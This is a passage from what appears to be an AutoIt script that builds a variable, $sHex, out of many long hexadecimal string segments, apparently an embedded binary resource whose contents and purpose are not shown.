214BFCC48095E2755FB34C7821CF2DA00B1908C1248D6940482043EF41BB185160460D1064F045EA7D1E151068D3E92F29B33BA5E90559C6C62FF581D9B827F00BC80F875F22CC1F91A5BF44520644F499BBA0F1C0602724893DD144214125F66C30A702A9256D0328BC201E635891045C816922C27E2F273C514807784942984708921C98816C8726DC138221EFF0207CE00A84044B6A4B16253018EA4595FE58CCB2B07633337B28AC6583669B33A5062BAE5EE4A55A6017B4D0BD5799E9B2E84811822041C843095A24BD7585E070D64A06ECB7830B32CC351701BE7170419DBEBFE8CBE82D963699821304372D23B441D0877700C19160A9222FA81B1C3446178AEC0587D0B32B221C03F52570F63882A3E8DD97AC0E162C40732767A1499E2FB3022D08D4EE7CED30BFDEE0160690D9D6FCD47545B4B4D9D6E440F446B4CE7A732B1C1625CE4D058AF0A72796CC5A4BC30AF98B2FB6913E64FB656826411BF866A449D435F4183A96D539E07529C331DA4C8BC75E00285F6F0A6042185C626EB0275B97492C41137200A9E43CC1225BE7F5BE6704E85C6D2B18D2146F1DDB7B86B54F574F83A62CC9055B4E6FDB9B7CECC3331CCF0292FC4F152FBC4A95A72EC9178A3E4E04A3C195B954E6E0F708F7D2BA2350F4E20B67B5416D2307D5E860BFA9C7FF87045DE7BE04D159301D5C72C91B16080906766EDA96D109043333D1DAC10541ABF442B56149F8D5ECAB62C7B77389D4C931062A6E1583683B"
    $sHex &= "E41B19B940F4E42C1B75A4D830A4E5458B0679B08A3BDB63C6933417EF1611008A88043306720D390534817CD70EB3E7061D1C45AD68C1C41B5174C082155C530F6C42A62D8F05E93CB7015C525B1056B80506B9A707E31048D718588AA969DDE8DF258E55115285774092DB91E3F9B939C83AD5202D168A884A044313C810D50C90D842BE15A1E497A61706F260715AA11B38169C9452D365D429A8453132C4B49DA244802999ECC7753AA86B09AFE86987C7146EEC2A807619C0B48EB1027D8F58DB808D39032DA1A02172857171DF3D2955D66F55810969B7E760D9473B0606BC00796DB0253ADD167C371ACB37A815B022B10FA47976352179602441BDD4282608545B634047258A9DC0ABEF06174E691FA5ECB992B91AB0092321C93F491D198B55EC05D74DD392545254011D79998E568133D62C010E2E8A913C4CB79138203542C277551CD33A56B0D62B18676F5C656ED3C761C81BA4888BB7B6A375EDCDD651954826C3C01D00BE0A756F79B41435041F02F0717AF5B868BAA8306CB72FC9417421C49F102DB60343C1A43DA46569100556C1DBCD237B58853B600CD335E26AE9E79DEC0D587BCB2E4A5DC7887C55524B01AE070C0947765880D0434D985160115C858D7DA4AA968B95014F0BA1020FC49D78B4A24B93AD151BA9C5B6F1E85BDD14D9A7950A044044110C9DA93DACD55D7B180173A7053DEC8A40274ED3500CBB37508511AC6D2F706298CCE4AFF095C068D830F065D33364472B43CF4F0BE464DAA32699712CAE090C64C44AAC6EBC072191A09CA10C78ABE9019377513114E25005E3C48B6AA05009583976A6E10163F9046B152850284A94ED0A93EBB87A0DB4C40AAE1D6D5FC48F9121E4BBB35FE4B4B13699AEE44BD455D5854973448A882205B6A0C0D1E9E4C1B605290A9C04FB3F41819D2A8F4B5C47290081B6F33D16B07AFC3F4A04995270766D678A19F487E35E9AC8B66D9BD4D3340631158C4FE0C0478D93111B28F4FDCD1A3B01C0CB80CF4303B922AC45C51A98544F127F9C481524F6B7763567110C204D383C901BA772855C8C9898F23438928C945194901003C8443CE8AE55183271871BB82C771308A7B91B3E76046005399FD30B11402559DE5066134A181D9057B101F9CBC0040F4A458C9BC2ECE006A720FD89A029B6056F165365DDA700696B953D4504A810DC2E12252B7728D34B0839B3F4214C8100B9D109822BA49A254C89218E56C67AF470B77D8EDD16B58B095A7E18230C8692C3BB9BBB8E5C3A202D3CF40330586F507179D312103E34D017EB1138260DF2D10202212C238A2BB660AD2C15816FED011D6DD50612503406B39B9B509C009B3D93F252AFAB4B4F2A2CC572C172014135015C270E12B58988E322C051E988DF88112B"
    $sHex &= "D8363733AFAE2074D4AFFC766AC113934E98A82DEC17E882752E0F16F414562E5938DF7592E3C008D8A3E422384418843B8450717121CF65840484842557C15B4D3371DC9548841CC87B8D343520E7412EADA21BA3550E4ABB2815A9E349115C46C3C8F109F7059EB6229D44AECF3025105B48D7D1C52C369281B575E8EB4A3B6F81F80BDB8AE98FA1F250A9D5CE2B0941BC55D6F556F051ED4F47B5840C015F9D4F64A2D8A533D1805C030B398047598B622E9947914267523761ECA5102656E148DC8025703B7A2D2125D41B5229404A0A7A13F6C8260D28056473E331BA319C3D818D9217F82D544528CF819226BD35FBC46420B808EB777B48AA3396011EA350F9BA370B75AFF56C7F15ADF4401E1D24A7C3D44B0168A58EE00608AE5259741D3213C3D242B30852050F3085452BA4C1977301E4A909870D5F285F5860469831114A767C1A5C8985094D41023858C122F509678455C8A9F7F3ECA1518556EF670BE4080CF595D49EA1C4A14ED5D59B000687D5339480E0A9CFB558257D6905B588819B2CCE79E467CE293381D6BB89D8636A10DC1F14E18D68452EDF1227F4F8741C1C2B7F7114D953071575EC773EEB0D3C16E731B21D6FF2DC20070878333CD68255E5C715F44B9A80958EF0D08A2D0531671590ABE35B45B11E5D171C67E48BE4835E0AE94846C4630D58C83798C4FF1513D6B6CF331DD136ADC0ECEFD36D78D1F2A044943F81EA1A420F16300B88B8D1860B9551109B7982893E2AC94CB75C3B3F8015C0458902B10A6B257FB69502FEE6F800763561BFB5032FB3894F29E1139B8589C9E568455A4D4F6B6D58A875C163036BF8440EC14CF49B5875C9491F93C1D185347170379779215183182F05498A12EF3E7075150423BC3F826BD5A905C9FC91125605AB47B579DD80395ECC2B0C5C9408F135257D5A5B859DA5526C2741D8121B9D514F83AC45A608E13C4FBED55A011193EF2C5E92EF4A01410CEE3CA423554AA9A468A50FD85D1D41042B22A9950216AE8723BC246FD80D2DE12C2E842E25B07EDF825F098CCC3EB00D29C4B4B84023132B5C6C070CA80F380983AEA86796F089F65394EB50985D8047504F81A4712945862DA8F91A846FEA509D0B825C9B64221E1730D6F1D225435C135A2BD6E9436B3FBA026DA81DE420242D2080D926E4FFCF2FE44B2636A81B39F4127016033E8B41000C4D3C25FA3976D1BD5501492B68132B957A9B86C8132BABD6B10318CFC15317380175805C95B3830281D1F7C4694C9B90E62445DC18C4CF85BC156B3B681C212EB423576DCE6323D9A9647FFC81262414A129316F205D45B8382307251DB1A14D010461D4762E376A710C388B30A502860C7D28254F78113C54B4048E066017039186E86AC704DBDF751B580D"
    $sHex &= "C273D81BB5A60DA4F9E12F09B00EE1ECD7FB68AB41CA052EA93D4D3A5542BD124C8360C4065A2A3D540916A73D05444FBDC28BC97B04BF6C086AC68013AF418753E903C4DDE152439769570A3C1F59C02D70080F2944A1869E628903DCEC6DA0D24C09367E1337D1D2831D009FBBB6090F4900426EB8D97AB6036F1A144DB9EC11419D5B082B6F0A2ED6C207A077F7D9B0F74A86BE3EB76F9A8B68BC16042176808EC627D26A034A0B0A9C10B7B7A4B347156F2BD1C11E8F2CE8669C890887124AE06AB088D699EBC8C46A07477D302E015E18A9E4280B464429B809CC4878B504D1CE4CCDF39E423F0621D306E6F9229E936C9E0C1D4425223541DEB5934B50614772068C3C9B777BA61FC006F123111DEFB4A79B17294A6F237B06A4B72F813CCB47DF1FF757DB8E6C16241A243D87072477F6DC9E60780F90D62F2504069EE7799E1C446C84ACC4279B770A4F25DC06E82604173CCFF33C2C44505C68DE9776F674672680771F8E06A1CFE69D0A2726B506DD270A229DBCDB697727620F6E16778536EFB4E706919DAF27BE06F9281A27EDE2796876170EC2CEE7797669570729212F3B9E771A9E96CAA72A3C0648603C9BE7797AB1BD2B144F3CCF76F6EB4F2BFE062C24304FDE69CFF3739CAA472CB606C9B279DA7BD7DF56E3F12D346ED3DE3B2D6F067B0F3FAA3787A73DCFF3069AAFC6DD372E163C9BE7790676B1E72F1747EF3DCFF3728089ABEFFFCFF36CDE2FC806EC300B274F73E69B6C27912631030631AC67F33CCF323580BAFA3389E45D249BC034032E0E496C9E67BB64063503BCE7360C1DCFC9F34A8BB6DE4767B35D3B370617B006388A390B6C78369BB23AC33B5CD6D63C12040FC7920FE387F7DE15CF7B3C4906ADB9D72116C57947362B3E3D7E3E343E4706669B9EE739779AC2EAEE3F127E6B4A21FF073F3A6ECFB3797D4017232F173BE779A7DD0751574066067280F36CB7B3AF8F40CC37F10641071DCDF33CCF5085BADEFB4279DE099E3C87AF4293069FBE673B2CEDE4AFCF42FC064311B4E7799E304564839B47DB553DEF43BC06CCE11F040F2A92A5B012075F734E1240F97D234AE122059B7C5B42262996FCA11F29C09D0E004D5AAB9447841D94C2F3096438B026B212E9402E7051FAAC306A0B5821D5AFA741ACC05B5DB310C2A404140CFD2B8338DF6270BF0352D011BEB92D85B306215CC642C251968662EC024EE59A1AF0F412709EC697FC70AD30ED1BD129404040187CB6C7C20D74BFD205A121326B828C301A5F30190EA3D7199B12764F304CEB83B98C43750D05DCF2099300524E205B3BAF67FC01F84C6A8371AAA8E0D32DE10A12AC591181584C12FD36F8F99DA34FB0B88A91EA8855E73BB8F845E94AA40FC76550434B017F850313D3D43E"
    $sHex &= "01AFF021D3CD4D1D2D21459661E62423F4508BC0A58F240BF72A4ABF37F80159038217D06136084D7E0FC2097E034B12254D0D5DD423A532D58A82EABCCA0F7BD4943C1095FAE1E14C72270F74201DC9060196FABC099D04D1859F09087366BA4C680BF42C7949108EFB388E92167AFF01194A3090E00AC5FC8D3484FB3C25F88B9089F6580A77356D498620E1A9075083F4F11A7E61F3064BC07B756A09E1AD95296445755B430D081DD132E9F88D100E9E018A43956BAD0AB6B51DF7A63481B063F9EC10D0812157F915249C5C44E7FC4D4ED13A0304FFC18F00E83ABD6574314F640847EB08483874187248047D54B2CE9806D0CD3F3A82B10322FB0F6B89F7A6670CAA6DA0840FE15887946C872031422388188DC9C94AE984D62D297E24B98636C1381917588149EDF529B57C98D93F302B94255BEB908DD2985C72729490A508D4024369F94D9524A1169F0002F26D3230512B046DB5415E455CD4F72AE4BB456325F3BA69268D2C77DC2EA2DC030AF590210E005E54DFEBC8DB0F8370B824F24768DBD9D290242D898A23835413849961A4E101E3EBC763B4819307C904045315612DC59FFCAA94AD241F848204EE24767F48483121601502BE0A125B68D06EBEA4AF9AA30651AF6900A900903F26A3DB24934B8A6A6F2293C5C6821316F90822D98AC2B7A9E8074BA8D371DBF04D4B7DE2658284EB9AB8DC716DC06BC9411E1D8D0BF77D93A1FD6E027A22707A1DEC0A88B8ED5C8B4453B2AE6562873219685EF7229177C0B609A4077DA614B6D1C3435DB10DEDE15FEB6010E569E9036B71DAC09BB4604162E1F39540A201E423F8FB72447753BDF0310851210D5CF0010369212BBF30E015F2145B45085055A17086B1C2405401922B26431F604409AF34BB45B42A10D83DA9209DA1A3C6E70886A0C22B9E46041E1C9CC3100DEB7A82A18C4731F3912240A9709811AC3FA18D8CBE8D8924E8711288CBB486E808BEA6DF4CEE0E84600C35E07E29DB522C968D2CF77137B868E01A65F95AC0BAA489C20D0656C72D3E31041C8A55DB8CDB08D163FD683D3C566181052B3003ADDD035BAB901DEB0FD3A56D2685208A14012380840001EA703C57C2F007850465887C01D4E89404955166927BA9B27A1942E4044A3468082A9A5E2DC781D0435DF09692BE00C3E830130C9E07258096A5E87418D985AE7F6CE1BE04673E94B774C8BDD58F228842C68732E2216A03351542E84F838AF4F35B4008DF0B1F6A08808B5CDB0F41004F1805E06106D6B191B60CBEDC7D27A180F786F48F50082C2B18A117E5458E2F46037040BDFDB185896C2ACFF71450C8C615572D0CC1D40288491EAC00DC223582A9381B071199B26B1B4A67641C2727E40519564B551DADAA87BB845397A9179340A3"
    $sHex &= "EB12B63560B5F7CDF0BA282005750719F0FB40368C6421D5049CE3D15423293102D2B195C797B5AA0961AD0462C5309F664378BB3747D275A0C0937CCC51B156965850A814F74113A831AF97AF2852F50651BCEA1C0035508B0B5220777504C5DCC90811608C76FECD14AC2212BFBE18C80379813852579B876A40588D4A0C365669108D6335A0DF2118074C5E6041D5DD55CC4082870DB9087675D47F2E442BA94A3452C206A57FC35894BE24F81CCD81C5A5145A1C75092DA2A697709016A5BF47B6AD6005834D755F84B04A8E005532709CFFC29BD460A6A123917A095E3E97A2FF9D80B18DE19BF1C3692C2957FC5681720EEEEB3A8F0DB524491B12757BA87EE2F66B37BF5DF411DDA496D44A9FE30A911A73FC18C0DD28BBF47E3003A1555D25FBC0A6ED825D2C524C0A14061D09404A670AFA86172DF5F03180FADD89DCC1065AA225BD9D14871983D0871B9119918B9D715DB6776743A02CA400C2A52D33891152E885138233212C928175415829688BD009125A0D78DF7D84744F97288DFFD826AA79D439065714C71CA45AE9F0337493A83448375730D47D4A43EF6643DF0C360718AF722D0CFC321C09EEDD59947C9A71F806741F6E14AC88046BA580531D28A7A9EB78F6613AB695CC8F4B358135BCEB5EF193963682D27F180C21DCF7DF03BF6CE9314750028A5A402B17812F1B3A1796082065ABB0CDBF01A046235F9B221D8E21675BFC9D41A28B0C55B22B8DBB46499A63F90C2D236007104DEB48E93C43201106DDBC74D3C02A59A2B343D3689AFFFB56686B5A510E9B5F8346AB6400BF08A962025849F8570B2E0C0537678681D0159A6475432DACD10264B0A9CF30816B06A4EB19B76013701753C1A2173706EC16EBAC35DF3CB8080C0075D09210325B1721ED9A9AC31F7A7CFDD6165ED3E0A760CA11701384930C3C0340889766826591989F94AE24E90CF2057D9E3A51B4FB23E1D2A1B14A08FA2354004C2168DC78D9E85203152875D074C9C844C18BA455C8C40C6111C2919F57F2A4F2C4333B86B7ED4F83F47F3B82B5886F7E15DD048185B62A8DFE0CD0F51260B182CC503F2996B00BB02785A9849D49279A0285E3B677523D0140E8E39E0A901A37404552A6BC7D6353C67CA324E0E98B45922E07096CBD7D1D515765C01D5B450B2C0316079B6C7969750A4690A6DC57EFAFDDABB9C5D1BE48207C401445B2F42CB4C45F2270B3A46FC4249F394D5D994CB0F30060AFA14B4518E75B8C45B1A793349C8D4576C1D61EF408D14580D19247C9A3F538F5B0585B1D8FF6508B45A00E2E01BB029F05E31FB9087D4DF1CCA0750448276D8140ECBD712DA03C63E841039F48880A017A03994F2C17AB4C80076FEBA49DE8B238DAA237C9085267192D8A2D146E3B63"
    $sHex &= "9B758FE1368040D13DB169C7DBFB3DB5452C482BA9B000EF0211F8F13C21403501BBB089EC4790845B733281773AE801BDA6D1D021D0360E0249DDD0C210869A13D075D97AA6670C9AB5E4086D697F300A1B2DBCF456AD1288D82071D1F7D5D627C7C3C685124947201A276A8B8DD80C04B8134F235502C2F702FE85042B009063C786BF14132C271CCC980CF2FCFE18EB38A604E5959C7FD291A4F637D843095888EC0016C0A8010D3EE50320E063B35E9DA9DB4C5CB9083E620B0F9E6065CD543914706D7134283630843711559075E96D19F49913FB3FAC002C25C62F2A5897B06F2D06F01EE15D688810CE3BA01EA2F66B753D590C89913F3665FC8B91080491BD0281F5D9F809F7D25BC3D7989713F61111C093857BE510F154E40236F1C3C4250D3A28752B6DE1F5350B52E1713301CBB83F30B3E1007B1C3A89028F0C65B07901E98FD2EE67C41181BD0B9000868D580D239F74CCFED9AF8667113821E96F4B86A04181933104063E0E9E00BA1327C0FBC30891E3998B37A6F97E9A47959F42E8A5695B9285CD9ED2950B48978943346D4B5BDC5583F4C08576E452B985B9954A1C73E052C19B308F112FB75CC355A50CD72C0B0A6E80013D055DB0D071C62482B30AA2CCC597DC22DCA2B0FB1F2A0B39219D778360BD42E88ADC57E1304D72E0E0AF6C50821B982C8B956D4186708B73635323032220E4A2DC20590F316114BD8B856D24D34F1F4A6CE125D5CE4C0C832105DC0444E92962AC2252581D83A97B0DCF381D87897EE1616848283D56494961F2A5101ABDDCC2043C9CB7A91064E27C05F3BC00041C477771658873516B5766CCBF1432F9BC2865211CC901A0104E4B5827630DC3C844E81281217DF8063158EB1301586974BB9E49C8C06554A90638827C3C4104201CB9B8492A3B1031A9437EB8DE3BBCC51C1B12B20D192548C3D7B1445A0895C6000919AACB36505523A03C2D09E28095AAADE11A42010A67BFD6650959A7872AED030ECA123F1F788550308D8C260B46B60063478379860576DA7D09B6152C1D741C813350B0CA801DB528C0B58D93C4162C5001632DCD2B1B1618885C6D6726F6240BF0102318470B3669047E4347969060487E93AB48C3AD0075120B34077B0144230418A82C3D8C8A030E426F20533301270D2B48C75C7585693105D886B39D3361AE9081CD08677C6520919F82DFC304CBC30C9168B5455288460212E108DAC13671A50C8C34A10C700631D32DC0FB0423898B2969807B6BB74735416ACC24941C6DCC1C07EEF1112861058BCB8F0D34C1234136A525054C00CE80072CBF392F512478C00D30CF28BD022F7783D128EB8604E140A0196D5DBA0FD158B14440820D2B794B61A6E88775CE9D18B9A784820D7904F111270476593F59"
    $sHex &= "5C42C8D605FD373A60B4573F970C37AF50C24F6B317E83CA4B50FCB4DE28952F992C56DC927289357D12F8C87D49B632140D77903FCD7588261DE12B4634231AA51AEABA5FAEC7B6040BEC1B93486509A10D1143820A0F138FBDD125970C08140C0D938A5D4700938C14311D8BC60BC8BBDD215BB1D02DA67B5D458E9B41E717F7D7A40710E73C6DE3807407E700D39990A1DD753BBE7514C4B6E10D39C41319F5B205B4C29D1268648D310CB9512D076908B3BF77EDCA776D08FB5D9531436AB3522D505D7B413509E5808DCE92B02A5399FFEB8405885C99835B0CE8039B7D17BA1350BA7C157FCF3B95437628AC02B9B54DBE28B0939DC9028733C93B7A435B09512A83C153573524C1629E4BB380EE5D1CE763742581E76521FB2308C38D4D80734690DC1E42B3414B00D695F682DB4A185DEB805166FA54C604FC25D0F6B40B5C5BD1613C4A08198131D0D0475FA6F7D22795D78E2D1463A5025E95511F1D0524AC08AB8F496235639DA11957DB8F4D0CEB3423CD44C9428D51C24F275E06BF0B427472EB74B80D49438323D11B06BD446503BA9B527013AD026904103C8D33C86C2D4044CD562A53A1B8B8568911BDD7D800C90B480D019AB8F765DF27DB448B8D03C79313CD9D3DC8B2BDB75A70466A512B5C2E2B9795851B859585895432923706DC72A53F444B63C9ED4317B595B5E1E9689595753742C0BBA27BC32931A54BE229E3DF2786B0BC81BD9B807514C74B01136DD243633CFD4CDAAA1D901CEB65F7CD5B149003CC8923DE82C83002CD162D14AD59145DA34F4C5783134BE33830D2F5415261AF459B0EDD29502911E0B4FD95CBA6B285B4E885B4B477ED7E5EB47D4CB4F58D54DD8573DC8581DCBECCA98BE871EB2DA5A78917328DD9EEAB486E191E447A8183B5EB5312DC21A9C3F65249215B2D67802BA25831AC8005B7E9B3B0DFAD1647C8141238B615E2204B831D547234E0ED4F395A08D7084384A75AC908750FAB01801C61C8349CD252068456803DAEB4C45D3463083178E985094261344530B12B0C381E73D76E07962FDBC12863B343EF6DC07D26F1B793D840E22040C10A00B25D45EBB05C8C5F95FB751B1B109B5C8CD3E1EB1D33100B0B06B8D114515311CE2100AD955CE782DB20DA74500FB8B231C38D8D79595A86C513FCF9278967377101901DFB57103A484BE90F84A42D040BCE8D70841D6FA8638D576585A626B2B90CD794A470348D2D57892C39213FC5A519A1C4743297563C8194CAE500BF083CDB97560822FCF9746C319A41D0A28D2B5750820B204F5EC061B460175C04B521347C6C2BA78FB7435A045A85B30B0511128D99FDC1257989D90CBD68097315870BA84BA411ABD52710DB4AAC10EFBD3514806D5D43F9EBB6B6642C0780BD0B"
    $sHex &= "52C007FDC8331153743154744EEB71F51CB666D02361340308339D768DD3EB6E010B97CB6597E94B0B8D858D4812B0BD1C8557970FD8B58C5B952349F5CC23572020FB303402055A257F428D7318534D0C0F1B2C23B17533A01067179FDED2FF20810E47A76A63F523152B6C2BB591C82E4C462E7FAD47BAD1890E3C146EEB120D78AF51FF249747AAC4987504EF1F4C309E91F998AB86730AD94CDC31116CD0046301F911EFB49B8824C1F903BD0BC15F11720C0FDF09616E8C7DE381E2974197E5765DE4A40EF313D24E8B6D5AD5C1E3DB01C1890A8975385B8F01D821EBCA10D1EB1ABAD26E603D101237270811A62DFB0DAC47509843294C2C99016E10F292754D0C748B821D0BD30F61905B50004D3BDFA5790B6BC6362C2151A6481738F9472CCB48134B4FE12694F1C0A89D284A8032C06123A43DB6B4A9356B7351050C044869C349AE2B2701EB2155A6530C200003EF18F22EAC9D7BAEB1407D2D166788E5AC22ED566534FF4E37B24C6DC792348D3D2C341A8180179A282DAA530F428676E600A0632CABD6E4649C9C35B840237BB98519052CB8C001EBADF48054A298A5984B89335A819B11BD0B86714C980B4A49E8A6856433C9FF81ED2B4C2E5B6233D227D941FE3C4D274E33C09CC0DB261964DAEB3A779E269FC7649241129D1F07462013484715011F48A13D34028FEDEB1BCD3687787A832B3713052C04D858DF0BD0393A0E19D92A374DEF31F97A5F4FC13B64422C46E0382918F9438B805027BFB11605C050A9E9CAC9C5588501341ECE5277A70F8DCF69E77B060098592B183959D683D29D0C2DB08526CDDD1A380B92441B143C4163E21248824616B940EF3612037A74D78AF718978BAB03834B80A5EDC4672A95DCC744740B2BFCEF0B78A4E014B63B34B2DF93D42FF7D83F0F231076BB7D7BE98D0EB9096F6B7D14BD042F95C038DE39751471A32037038FDA7F0CB8CB1456870C910E9DDFA902FF73E8A029278C7390A11746409DF20B856988FFB72E4C988813125AA50803493014DDBB3891E4FA345980FBE46465E5848D808D847C9670E3BA7C651304670AC0BA311E97D6F0A01F1B0C032C348CAB8E6800F0988331E34CB01D3DA411E1EA664AF302B81FAA3AF95507018B851C2E6B04A4E8440F35868A558FA1110FE51AB213EB573FAF74F23C97CB78747875706518295D702770B0D006B6B19D315524BA11FD1CA452100ADB568550C348DC38242B1422147B26F1035E8C11B8C0C5D95E32B5511B199BD1014CFD0C77E0FBAA851C72C96C6C6C1DB8238CC71B751295A25A15181F272839A8A57B753DE0A0C03108496D0A9B44E35723965C4F70C16C2243D2107D6C6C005CA7D0A04C373434094A359BDB84551BC0083DD8E8ED102341812A4CBCB14282"
    $sHex &= "2BFDA3AE86F16FD10C238E34914D7F6DD9C2FB84A844FE20212C50392930484854CC349E632BC295172769C1201CBF13775D689AAFF8E35919D9910B694C303CEB7BC10DFB6940787E65F724E6A48C14FF4D18CFC2E506671CDC4C6C709530CF20A968FE74F6099C0C97642234CE21144168FE6B470A0C76FBEFCFCA263A6F8A6D350B7601823BF65FF916F176A92C0195484C1864687827751450812C1CE97E588850C570294460176F8D3502EA148AADBED276B11550BD0748488C09D6D2BDB689C22D03A9545C111C6877628383891BE9C9290C1B01AB2E0554BA6B0014953552BC84050B86E94E771DB763C38147BDE123749038F84254EB0D5B98546B5AB89AA5D757034AD9187319A02056063048641C571C352D7C3751D3D050D0BB1378425A5122C0B03B25A003806096F0B048C8F2F03077278D57108303132C0CB47360D47E760740BB2CCDCFEA5B59D2599A4B7DDE2250451E66E12001289C8001127020958D4CE420318C8D00C5AC69832D477768DD167E2F847F05E0D9A52E609C681D8118B5BE1C980FB183C4E43A64B136DA202B22855C8B5E3B2436B7D0DC83AB17477436841705A069982D3BDC31AD2154A685DE5483341C0007BE6025B6601F617FAF78402F20155298550CEC1C9C420C5498638BE9186CE1B5A4539FDC09EA0355A4A4730B02C1DF246F98EB1AEB13553D25CC20AE05870D8D00ABF54997EF039BA61D63888C989C77C5E0A307583BA777133A6856FCB8579CC6BEEB74E23CF18A38C64A030731C0225FC22A325918A60349B18869AC2069AB366D836044B11FD3EDB085EB75032A3F2E52C3F6CE89616517C7D68ED414FB6F46BA16EC61DDFA4817B6B54D8019DFFF9B5E203DA9524584FB2C7843047968795B78E51A18E2548D481FEB2DF7328505F9F3F8751EC26E3C0A67870588258D6C6C73A4F488AC4CD3E5D68E78163349DE33D3625F24533303E1B184B751142B0124D06097B035A3B68812E622D130254F4A48E830B7E3D23C330AF330C130261D35E965655C019EAD54645CE70EA7CA5669930D27A1A0C57BD2FA11132F6FC947E071450012401C72C821484C504C32159A57641068BAF056BF29035C68186F509F6582CEE5DB454D5C6064AB2C3C39649B316B087A19AFC9349334F269E5F2C93460871B596880D92AE1362F452BC007827A0F9999F930210FAF8B04025234343D43D9C1F51B3F867EB11DA1B8F9520DDB83A68C00802311A4E9124607B106E1B86C35999D7B8980E73CCA951B6B00AD602B6A7BC7C0D906E8ACE70BD15CA4EBD6DB16B5508600914638036017A9B85BED0A57D88B84A971A472A734B967A43B2C5B404917EFE5684B8951397D0F3101AC7D028D4FCB068A95067C8B13B5882B0378ED252979FC861BB57B9F"
    $sHex &= "CAA160E9745458854C493E4F3E85588D488D5438428241A378485028AC10AF45C24CBB84B5AF812FF4031E43BA731A858A4285C3077B88024A6D3839C027ED0A3054BDC77D5AAD425C0D6F4C84142A70822BEB4895A0E9550D6390073358209ACA83CB3DC43E8D58084C18D88E4122AD4D50C67984294B4CE74C5B0FEF81350B1C8E24254845873F1B0CE41803286177494F194E0B9334CB5CD0548699DB5E4C4C6D07A8516FCF78C3C1D92401322545EB9AE219858D95EFB9100439648D2E77751CE94241AF28BB062EE20F878911F3401AC1C24824225B18045D692F6DA370149135B2381B8D0F95520761276AEEDC6ACC981A17143524DE8E71C57F698800E5814E34A165382890DF109B6B69F10ACD8515689B48AE814F907E2482C45D2F17C6B00591339BA9042B89DB875496703177190118A8491D8583A27032B548BD5E20523537B10A623819A4B2104D314D4410831BDF1306CAEA05E31CA45B89D497FC01EB1557D40191B1B92117878CEC4BA6CCD001D23ADF82FBE382220D77E05FE81E1BA492E41151FE949AC6C6816AB189944002531B4E40979552CB11BC742D7D406E88B80A9111A34D770A27EBBB1D2BE1C920ABA58CBDF85C1C2CB684F927F585912C6B517F154A98B82B5D56667D8B0C2AEC4A2967DC6B5BE107BE1004177413BA913C30AABE24D50525030743D76922A06B911A54D8DC20937469A6444458A725B813E1C43F18C20C1D0175746A01408A175CF1D806A3D08191D90DDB817A180F24289F28C30B5EC8C2450041F142240BCD7FF1216CDB152F28E193A564AA87A14F152B424219F9DDEAC72D5DE8DCE44C1164836A03F028343A6DE38AA1B727310304AB52AA217DA109E20DC5EBA90D28574906643A7BFCFC1D2B2B1DC4913B95744BE729615874444DD47F98A863B88A2F29A326DA5A90E16DD10DC56E9017EBA409453E7306EAE24D8189C91790855704777515DE7D43F6FDD4019B1B2C6B1170B2B56AC2730438502722A7476EC9C0770457CB4E51B8539B176132490130F64040ED1AA00C403D39103461E98A2E30E724A728259B32BE589B9672D9536468837595831F172C929461391943704C40991B158BD6250BB19BA1E802C2EB6DB1E53FBCA89707EB4F00418842464086A21CF332CBF8BD16E72BEB66884A1C34857B8B01A134582C0BE1FDE35BF208084065F5737558316107F13C2FCCC5C80BC1EB2B972838FC1A4F9C08B717BFE21200990AD09DFE0B52550C250AA1630F0203A540B78D84C6711A8AFA433A6D611CBB49C14B73C31C218B4D955154FB52B6A601F7ED5B16B217499C51693A4BED7B1C8DD5FC1C6363A46384B976B3A95C8A4CD8EE30D8C19337261717192203BA24C304404C3DE0224FC17F023B0C373EE04E3BC1E25B"
    $sHex &= "C7E0A2C2A94C164D34179EB02A39A91F0D868558DBA1A802C6056B2B218000450D770A175C80092C1CE1405A332C2C950B2F23544BD8C6185269A7ED52303BDBA4910894309C8A6561EFEB208329DC6DBB082898EE01BFCD8A02D5542A6A01C80DA1D244E10193017126B5180E2D7921DAB0B4B1FC93A34E5309801ABFC763DD1AC363DB44E1E5221F3074734AF8951AAD4ABF54F592B06267955C43481A10D1826198400797FE3F50EBC08A454B15F0681C47A6111D5F622582BC07122C04F940E48E005508C21D285D2FC10BE40A5CAEEB4C4C3944939ED842C1277536A7482173C28F590AFB090E5B23643BD17D127D0B7C435AC35048885164638288C024D7AB348EA6FD50658F62C72A8914F1BBFDABC00B3111CB027D156832F4DA582D4EEDB0A9448CA757FA753B9D028F4813C79D6B887421031B0607F61158E45F1E93F275BA99D0920FB53C2D8D230DBFC580CD225E9D371C955B096D80479D27297819C4C6AE4812934A6276343ED52854A10D9CF70354EE00D734289CE8817AA310E69D152B84C4627B9F4E303E2546FAF8B11E36F073C0E5B7459471160D33178D50531AB96AB1C1B18551990BA7522DB94C3030216E32D63682DF208BFA1802BA4AB0501329B403F5AC00A1AE450C1278418D4481ABFB209F029F58D0E4CB95BD69180DEB31F2C8CF5DB9C5BD20041C1C3505D8BEA95DA5191041B03C77A96D24303C3A510981AF7D50280F3B4E12070C63288A4011D0051F55D3164B2101DB12D171B734B68A15DA163D1A5EA4407E1635F450E248954D86379D26B7D530F5C1141B4670AADD412459CD622031E0C6421721431B0C02710C885B3D948820120B85522588392B399DB4903538AA343898B470653A34497CA08E985B161C50021A814EC8D51A14C2140F2C97E1A50256C03DA7570CBD093E3D0465E99D1D82890199E8121C3983E28D7DB884C2079DE8DA5C8011458513731F80D480A7DFAD39B704BF043DDC5A08CD162100013B8C2A5808E40C07CC2D9EEF8B7FE0EC76753F59637531D52E7CD44398812695736E2C81867DFACE3F3940CE262F612D7F7C5E54082307EB7CB9E005CFA12C7409157536B78DA1059C6053057AF744E110186D3928E3AD962321410679B5346B4175EA5E093190D8471280AB042E697338601C10F10D19DB0EC7ABAB752289110163B92B89DE2A4ABFDE200D9E4AD5A1938FC167E3A75EE948282B66ED66903E5426F5C9E82C5013D1C9E3035846B15B1314AF5019E6236025D59995500CBCE59052340F2AD025786130C9038DBF450982D76CDF9B6004116F51B18E44107189B78D360C6F1859337C12453B358958487B2F7532D4308508B12B25D5C93A43727BEB64B17F2C20255B2813B01E5C2788B1B773B01755F04874094B"
